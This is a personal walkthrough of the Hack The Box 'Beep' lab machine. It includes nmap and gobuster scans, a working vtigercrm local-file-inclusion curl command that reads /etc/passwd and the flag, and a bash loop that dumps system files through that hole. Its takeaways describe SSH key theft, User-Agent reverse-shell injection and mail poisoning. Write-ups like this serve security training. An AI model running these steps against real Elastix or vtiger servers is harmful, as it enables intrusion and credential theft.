# Beep
Box: https://app.hackthebox.com/machines/Beep
## Enumeration
```bash
# Nmap 7.92 scan initiated Mon Jan  3 16:51:21 2022 as: nmap -sC -sV -oA nmap/scan -v 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.021s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL AUTH-RESP-CODE TOP USER IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES LOGIN-DELAY(0) APOP STLS EXPIRE(NEVER) PIPELINING
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed STARTTLS OK ATOMIC URLAUTHA0001 LITERAL+ MAILBOX-REFERRALS THREAD=REFERENCES RENAME LIST-SUBSCRIBED SORT LISTEXT MULTIAPPEND ID NO X-NETSCAPE THREAD=ORDEREDSUBJECT ANNOTATEMORE UIDPLUS UNSELECT CHILDREN IMAP4rev1 CATENATE SORT=MODSEQ IDLE RIGHTS=kxte BINARY ACL IMAP4 NAMESPACE QUOTA CONDSTORE
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2022-01-03T06:55:55+00:00; +1h01m05s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8
|_SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1h01m04s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  3 16:57:54 2022 -- 1 IP address (1 host up) scanned in 393.30 seconds
```
- Look to have quite a few ports open
- Starting with http on port 80, we get redirected to https on port 443 and presented with a login screen
![[Pasted image 20220103170056.png]]
- Default credentials like admin:admin and admin:password dont work
- I do the following gobuster scan
```bash
gobuster dir -t 100 -u https://10.10.10.7 -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -k -o gobuster
```
- Gobuster output:
```bash
┌──(tom㉿acer-computer)-[~/htb/beep]
└─$ cat 10.10.10.7-gobuster 
/.html                (Status: 403) [Size: 283]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/.htm                 (Status: 403) [Size: 282]
/.html.php            (Status: 403) [Size: 287]
/.htm.php             (Status: 403) [Size: 286]
/index.php            (Status: 200) [Size: 1785]
/config.php           (Status: 200) [Size: 1785]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/.                    (Status: 200) [Size: 1785]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/.htaccess            (Status: 403) [Size: 287]
/register.php         (Status: 200) [Size: 1785]
/.htaccess.php        (Status: 403) [Size: 291]
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/.htc                 (Status: 403) [Size: 282]
/.htc.php             (Status: 403) [Size: 286]
/.html_var_DE         (Status: 403) [Size: 290]
/.html_var_DE.php     (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 287]
/.htpasswd.php        (Status: 403) [Size: 291]
/.html..php           (Status: 403) [Size: 288]
/.html.               (Status: 403) [Size: 284]
/.html.html.php       (Status: 403) [Size: 292]
/.html.html           (Status: 403) [Size: 288]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/.htpasswds           (Status: 403) [Size: 288]
/.htpasswds.php       (Status: 403) [Size: 292]
/.htm.                (Status: 403) [Size: 283]
/.htm..php            (Status: 403) [Size: 287]
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]
<SNIP..>
```
- Gobuster identifies a `/admin` directory
- Navigating to this directory i get presented with an authenication prompt
![[Pasted image 20220103170429.png]]
- Default credentials again do not work, might try brute forcing later if I dont have success anywhere else
- Hitting cancel directs us to `/admin/config.php` and says that we are unauthorized
- We have some information disclosure on this page
![[Pasted image 20220103170632.png]]
- Clicking on the recording tab takes us to yet another page
![[Pasted image 20220103170758.png]]
- This page says we are using FreePBX version 2.5 which is different to the last page which said we were using v 2.8.1.4
- Using gobuster on this page shows that a directory `/modules` exitst
- Navigating to this shows several files containg php code
- Going back to the nmap scan and notice another http service listening on port 10000
- Navigating to this page we are presented with yet another login page
- After atempting to login with default credentials, I get an error message saying that my IP has been blocked due to too many authentication faliures
## Exploitation
- With a lot of things to enumerate, I start with googling around for exploits for freepbx 2.8.1.4 exploits as I dont have a version number for elastix running on port 443
- I find a metasploit module
- Running the module against the server does not result in a shell as meta sploit error saying exploit completed but no shell was created
![[Pasted image 20220103182605.png]]
- Back to enumeration
## More enumeration
- After reviewing the gobuster scan, the result `/vtigercrm` peaks my interest
- Navigating to this page shows yet another login page
![[Pasted image 20220103194356.png]]
- I notice the version the software and version number in the bottom left and throw that into google
- I find [this exploit](https://www.exploit-db.com/exploits/18770) on exploit db, which is a local file inclusion exploit
- The LFI works 
```bash
┌──(tom㉿acer-computer)-[~/htb/beep]
└─$ curl "https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00" -k
root:x:0:0:root:/root:/bin/bash
<SNIP...>
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
<SNIP..>
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
<SNIP...>
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
<SNIP..>
spamfilter:x:500:500::/home/spamfilter:/bin/bash
<SNIP..>
fanis:x:501:501::/home/fanis:/bin/bash
```
- Form this we can identify the users spamfilter and fanis
## Exploitation again
- Attempted to use php filters to leak the website source code however I was unsuccessful
- I was able to leak the user flag by doing `sortfieldsjson.php?module_name=../../../../../../../../home/fanis/user.txt%00` however I feel this is sort of cheating as I am not actually the user yet
- I create the following bash script in order to retrieve useful files
```bash
#!/bin/bash

for i in $(cat /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
do
        contents=$(curl "https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../.."$i"%00" -k)

        if [ $(echo $contents | wc -c) != 0 ]
        then
                echo $contents > $(echo $i| tr '/' '_').txt
        fi
done
```
- Config files for website must be stored in a non standard location as i did not get any config files
- **Walthough hint - Elastix exploit `/help`**
- Looking at searchsploit results both the LFI and RCE exploit look interesting
- Going to start with the LFI exploit
- This lfi example brngs up a config page with users and passwords in it
- Now have credentials for the asterisk user and admin
- That password works getting me into the admin portal
- When trying to ssh as asterisk i get a connection reset error
- I attempt to ssh in as root using the same password and am successful
- Able to get the root flag
## Review / Take aways
- After doing some research on the box, it turns out there are multiple ways of exploiting it
- Always look for help docuemts, as they can tell you version numbers or dates
- When I get stuck I should always go back a step in my enumeration process and see if there was a result I missed or a result I was going to review but forgot
- The reason the php filters did not work was due to the position the vulnerable variable in the url in the backend
- e.g if language was a vulnerable varable and the php code was
```php
@include("include/language/$language.lang.php");
```
- Even though language was never sanitised, because it comes after `include/language` adding a php filter would make it look like `include/language/php://......` and would not show anything
- If it was at the begining,  the php filters would work
- If instead of include it was get_file_contents it would get contents of the file and not execute any code
- Can identify the user of a web server with LFI by getting the file `/proc/self/status`
- Look at the User Id (uid) and Group Id (guid), go back to the `/etc/passwd` and look for users that match those details
- Always good to check for ssh keys on the server as they would be an instant win
- Copy home directory of user from the `/etc/passwd` file and using the LFI include the file `<Home path>/.ssh/id_rsa`
- Another good file to try to include is `/proc/self/environ`, this file may have variables that the webservers has.
- This is useful as a common variable is the User-Agent and if we can retreive that page we could put a reverse shell in the User-Agent field of our request
- Can communicate with the SMTP server using telnet
- Can send a mail to the server and then use LFI to retreive the mail
- Injecting mad code into the email can result in code execution
- Walkthrough: https://www.youtube.com/watch?v=XJmBpOd__N8